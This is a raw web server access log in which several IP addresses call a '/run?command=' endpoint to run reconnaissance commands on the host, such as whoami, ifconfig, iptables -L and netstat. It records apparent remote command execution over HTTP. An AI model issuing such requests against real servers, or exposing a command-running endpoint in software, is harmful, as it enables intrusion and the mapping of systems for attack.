81.155.65.157 - - [19/Jan/2015:15:18:00 +0000] "GET /run?command=iptables%20-L HTTP/1.1" 200 0 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:18:12 +0000] "GET /run?command=dnsdomainname HTTP/1.1" 200 58 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:18:25 +0000] "GET /run?command=hostname HTTP/1.1" 200 16 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
96.44.10.210 - - [19/Jan/2015:15:18:37 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
69.200.244.246 - - [19/Jan/2015:15:18:38 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
69.200.244.246 - - [19/Jan/2015:15:18:38 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
69.200.244.246 - - [19/Jan/2015:15:18:38 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
96.44.10.210 - - [19/Jan/2015:15:18:40 +0000] "GET / HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:18:47 +0000] "GET /run?command=lsof%20-i HTTP/1.1" 200 287 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
69.200.244.246 - - [19/Jan/2015:15:18:48 +0000] "GET /run?command=whoami HTTP/1.1" 200 7 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
69.200.244.246 - - [19/Jan/2015:15:19:07 +0000] "GET /run?command=netstat%20-tpln HTTP/1.1" 200 228 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
81.155.65.157 - - [19/Jan/2015:15:19:19 +0000] "GET /run?command=netstat%20-antup HTTP/1.1" 200 509 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
64.121.46.116 - - [19/Jan/2015:15:19:43 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
64.121.46.116 - - [19/Jan/2015:15:19:44 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36"
81.155.65.157 - - [19/Jan/2015:15:19:50 +0000] "GET /run?command=netstat%20-antpx HTTP/1.1" 200 994 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
108.73.130.33 - - [19/Jan/2015:15:20:08 +0000] "GET /run?command=ls HTTP/1.1" 200 118 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Nexus 6 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"
108.73.130.33 - - [19/Jan/2015:15:20:08 +0000] "GET /favicon.ico HTTP/1.1" 404 209 "-" "Mozilla/5.0 (Linux; Android 5.0.2; Nexus 6 Build/LRX22G) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36"
69.200.244.246 - - [19/Jan/2015:15:20:25 +0000] "GET /run?command=ifconfig HTTP/1.1" 200 432 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:35.0) Gecko/20100101 Firefox/35.0"
81.155.65.157 - - [19/Jan/2015:15:20:27 +0000] "GET /run?command=netstat%20-tulpn HTTP/1.1" 200 283 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36"
